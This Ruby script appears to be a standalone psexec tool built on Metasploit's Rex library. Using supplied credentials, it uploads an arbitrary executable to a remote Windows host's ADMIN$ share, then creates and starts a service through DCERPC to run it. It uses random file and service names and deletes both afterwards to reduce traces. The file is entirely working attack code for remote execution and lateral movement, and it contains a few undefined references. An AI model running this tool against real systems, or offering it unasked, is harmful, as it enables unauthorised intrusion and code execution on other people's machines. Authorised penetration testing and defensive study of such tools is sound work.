#!/usr/bin/env ruby
#
#
# This is rough and dirty standalone (Rex only) psexec implementation
#

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end

$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', 'lib')))
require 'fastlib'
require 'msfenv'

$:.unshift(ENV['MSF_LOCAL_LIB']) if ENV['MSF_LOCAL_LIB']


require 'rex'
require 'rex/proto/smb'
require 'rex/proto/ntlm'
require 'rex/proto/dcerpc'
require 'rex/encoder/ndr'
require 'rex/proto/smb/simpleclient'


# SMB constants from Rex
SIMPLE = Rex::Proto::SMB::SimpleClient
XCEPT  = Rex::Proto::SMB::Exceptions
CONST  = Rex::Proto::SMB::Constants


# Alias over the Rex DCERPC protocol modules
DCERPCPacket   = Rex::Proto::DCERPC::Packet
DCERPCClient   = Rex::Proto::DCERPC::Client
DCERPCResponse = Rex::Proto::DCERPC::Response
DCERPCUUID     = Rex::Proto::DCERPC::UUID
NDR            = Rex::Encoder::NDR


def print_error(msg)
  $stderr.puts "[-] #{msg}"
end

def print_status(msg)
  $stderr.puts "[+] #{msg}"
end

def print_lines(msg)
  $stderr.puts "[+] #{msg}"
end

def usage
  $stderr.puts "#{$0} [host] [exe] [user] [pass]"
  exit(0)
end


def dcerpc_handle(uuid, version, protocol, opts, rhost)
  Rex::Proto::DCERPC::Handle.new([uuid, version], protocol, rhost, opts)
end

def dcerpc_bind(handle, csocket, csimple, cuser, cpass)
    opts = { }
    opts['connect_timeout'] = 10
    opts['read_timeout']    = 10
    opts['smb_user'] = cuser
    opts['smb_pass'] = cpass
    opts['frag_size'] = 512
    opts['smb_client'] = csimple
    
    Rex::Proto::DCERPC::Client.new(handle, csocket, opts)
  end

def dcerpc_call(function, stub = '', timeout=nil, do_recv=true)
  otimeout = dcerpc.options['read_timeout']

  begin
    dcerpc.options['read_timeout'] = timeout if timeout
    dcerpc.call(function, stub, do_recv)
  rescue ::Rex::Proto::SMB::Exceptions::NoReply, Rex::Proto::DCERPC::Exceptions::NoResponse
    print_status("The DCERPC service did not reply to our request")
    return
  ensure
    dcerpc.options['read_timeout'] = otimeout
  end
end


opt_port = 445
opt_host = ARGV.shift() || usage()
opt_path = ARGV.shift() || usage()
opt_user = ARGV.shift() || usage()
opt_pass = ARGV.shift() || ""

opt_share = "ADMIN$"
opt_domain = "."

socket = Rex::Socket.create_tcp({ 'PeerHost' => opt_host, 'PeerPort' => opt_port.to_i })




simple = Rex::Proto::SMB::SimpleClient.new(socket, opt_port.to_i == 445)

simple.login(
  Rex::Text.rand_text_alpha(8),
  opt_user,
  opt_pass,
  opt_domain
  #datastore['SMB::VerifySignature'],
  #datastore['NTLM::UseNTLMv2'],
  #datastore['NTLM::UseNTLM2_session'],
  #datastore['NTLM::SendLM'],
  #datastore['NTLM::UseLMKey'],
  #datastore['NTLM::SendNTLM'],
  #datastore['SMB::Native_OS'],
  #datastore['SMB::Native_LM'],
  #{:use_spn => datastore['NTLM::SendSPN'], :name =>  self.rhost}
)
simple.connect("\\\\#{opt_host}\\IPC$")

if (not simple.client.auth_user)
  print_line(" ")
  print_error(
    "FAILED! The remote host has only provided us with Guest privileges. " +
    "Please make sure that the correct username and password have been provided. " +
    "Windows XP systems that are not part of a domain will only provide Guest privileges " +
    "to network logins by default."
  )
  print_line(" ")
  exit(1)
end

    

fname = Rex::Text.rand_text_alpha(8) + ".exe"
sname = Rex::Text.rand_text_alpha(8)


# Upload the payload to the share
print_status("Uploading payload...")


simple.connect(opt_share)

fd = simple.open("\\#{fname}", 'rwct', 500)
File.open(opt_path, "rb") do |efd|
  fd << efd.read
end
fd.close

print_status("Created \\#{fname}...")

# Disconnect from the share
simple.disconnect(opt_share)

# Connect to the IPC service
simple.connect("IPC$")


# Bind to the service
handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"], opt_host)
print_status("Binding to #{handle} ...")
dcerpc = dcerpc_bind(handle, socket, simple, opt_user, opt_pass)
print_status("Bound to #{handle} ...")

##
# OpenSCManagerW()
##

print_status("Obtaining a service manager handle...")
scm_handle = nil
stubdata =
  NDR.uwstring("\\\\#{opt_host}") +
  NDR.long(0) +
  NDR.long(0xF003F)
begin
  response = dcerpc.call(0x0f, stubdata)
  if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
    scm_handle = dcerpc.last_response.stub_data[0,20]
  end
rescue ::Exception => e
  print_error("Error: #{e}")
  return
end


##
# CreateServiceW()
##

file_location = "%SYSTEMROOT%\\#{fname}"

displayname = 'M' + Rex::Text.rand_text_alpha(rand(32)+1)
svc_handle  = nil
svc_status  = nil

print_status("Creating a new service (#{sname} - \"#{displayname}\")...")
stubdata =
  scm_handle +
  NDR.wstring(sname) +
  NDR.uwstring(displayname) +

  NDR.long(0x0F01FF) + # Access: MAX
  NDR.long(0x00000110) + # Type: Interactive, Own process
  NDR.long(0x00000003) + # Start: Demand
  NDR.long(0x00000000) + # Errors: Ignore
  NDR.wstring( file_location  ) + # Binary Path
  NDR.long(0) + # LoadOrderGroup
  NDR.long(0) + # Dependencies
  NDR.long(0) + # Service Start
  NDR.long(0) + # Password
  NDR.long(0) + # Password
  NDR.long(0) + # Password
  NDR.long(0)  # Password
begin
  response = dcerpc.call(0x0c, stubdata)
  if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
    svc_handle = dcerpc.last_response.stub_data[0,20]
    svc_status = dcerpc.last_response.stub_data[24,4]
  end
rescue ::Exception => e
  print_error("Error: #{e}")
  exit(1)
end

##
# CloseHandle()
##
print_status("Closing service handle...")
begin
  response = dcerpc.call(0x0, svc_handle)
rescue ::Exception
end

##
# OpenServiceW
##
print_status("Opening service...")
begin
  stubdata =
    scm_handle +
    NDR.wstring(sname) +
    NDR.long(0xF01FF)

  response = dcerpc.call(0x10, stubdata)
  if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
    svc_handle = dcerpc.last_response.stub_data[0,20]
  end
rescue ::Exception => e
  print_error("Error: #{e}")
  exit(1)
end

##
# StartService()
##
print_status("Starting the service...")
stubdata =
  svc_handle +
  NDR.long(0) +
  NDR.long(0)
begin
  response = dcerpc.call(0x13, stubdata)
rescue ::Exception => e
  print_error("Error: #{e}")
  exit(1)
end

#
# DeleteService()
##
print_status("Removing the service...")
stubdata =	svc_handle
begin
  response = dcerpc.call(0x02, stubdata)
  if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
  end
rescue ::Exception => e
  print_error("Error: #{e}")
end

##
# CloseHandle()
##
print_status("Closing service handle...")
begin
  response = dcerpc.call(0x0, svc_handle)
rescue ::Exception => e
  print_error("Error: #{e}")
end

begin
  print_status("Deleting \\#{fname}...")
  Rex.sleep(1.0)
  simple.connect(smbshare)
  simple.delete("\\#{fname}")
rescue ::Interrupt
  raise $!
rescue ::Exception
  #raise $!
end

